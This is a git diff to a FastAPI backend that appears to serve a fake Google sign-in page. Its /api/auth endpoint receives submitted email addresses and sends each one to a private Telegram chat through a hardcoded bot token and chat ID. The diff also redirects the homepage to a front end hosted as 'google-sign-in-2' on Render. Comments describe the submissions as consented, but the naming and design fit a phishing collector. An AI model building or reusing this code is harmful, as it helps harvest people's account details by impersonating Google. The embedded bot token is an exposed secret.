@@ -3,6 +3,7 @@ import requests
 
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import RedirectResponse
 from pydantic import BaseModel, EmailStr
 
 app = FastAPI(
@@ -10,17 +11,24 @@ app = FastAPI(
     version="0.2.0"
 )
 
+# FRONTEND URL
+FRONTEND_URL = "https://google-sign-in-2.onrender.com"
+
+
 # CORS configuration
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],
+    allow_origins=[
+        "https://google-sign-in-1-1jgt.onrender.com"
+    ],
     allow_credentials=False,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
-# Telegram configuration
-# IMPORTANT: Use a newly generated token from BotFather.
+
+# TELEGRAM CONFIGURATION
+# Use a newly generated token from BotFather.
 TELEGRAM_BOT_TOKEN = "8976557269:AAEAZ_KUFPrk2qxrSdoqcH7MCcFufwvx42k"
 TELEGRAM_CHAT_ID = "8145643961"
 
@@ -30,17 +38,16 @@ class EmailRequest(BaseModel):
     email: EmailStr
 
 
-# Homepage
+# HOMEPAGE
 @app.get("/")
 def home():
-    return {
-        "status": "online",
-        "message": "Application is running successfully",
-        "documentation": "/docs"
-    }
+    return RedirectResponse(
+        url=FRONTEND_URL,
+        status_code=302
+    )
 
 
-# Health check
+# HEALTH CHECK
 @app.get("/health")
 def health_check():
     return {
@@ -48,7 +55,7 @@ def health_check():
     }
 
 
-# Receive voluntarily submitted email
+# RECEIVE VOLUNTARILY SUBMITTED EMAIL
 @app.post("/api/auth")
 def receive_email(data: EmailRequest):
 
@@ -62,7 +69,6 @@ def receive_email(data: EmailRequest):
 
     print(f"Received email submission: {email}")
 
-    # Telegram notification
     telegram_url = (
         f"https://api.telegram.org/"
         f"bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -71,7 +77,7 @@ def receive_email(data: EmailRequest):
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": (
-            "📩 New Consented Email Submission\n\n"
+            "New Consented Email Submission\n\n"
             f"Email: {email}\n"
             "Source: Email submission form"
         )
@@ -111,7 +117,7 @@ def receive_email(data: EmailRequest):
     }
 
 
-# Local development
+# LOCAL DEVELOPMENT
 if __name__ == "__main__":
     import uvicorn
 
